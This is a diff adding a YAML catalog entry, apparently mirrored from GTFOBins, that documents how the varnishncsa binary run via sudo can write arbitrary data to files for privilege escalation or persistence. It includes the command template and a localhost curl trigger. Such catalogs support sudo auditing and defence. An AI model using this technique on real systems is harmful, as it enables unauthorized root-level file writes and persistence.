@@ -1,0 +1,95 @@
+id: gtfobins/varnishncsa/file-write/sudo
+type: binary
+platform: linux
+name: varnishncsa
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
+  comment: 'The command hangs, so the trigger command must be performed asynchronously or in another terminal:
+
+
+    ```
+
+    curl -H ''xxx: DATA'' http://localhost:6081/xxxxxxxxxx
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/varnishncsa/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        varnishncsa:
+          comment: A running `varnishd` instance must be available.
+          functions:
+            file-write:
+            - binary: false
+              code: varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
+              comment: 'The command hangs, so the trigger command must be performed asynchronously or
+                in another terminal:
+
+
+                ```
+
+                curl -H ''xxx: DATA'' http://localhost:6081/xxxxxxxxxx
+
+                ```'
+              contexts:
+                sudo: null
+                suid: null
+    upstream_url: https://gtfobins.github.io/gtfobins/varnishncsa/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-write
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:13fca449c494b6765762261062640d8888381839b59a40729c1d9fd63cc8dc9d
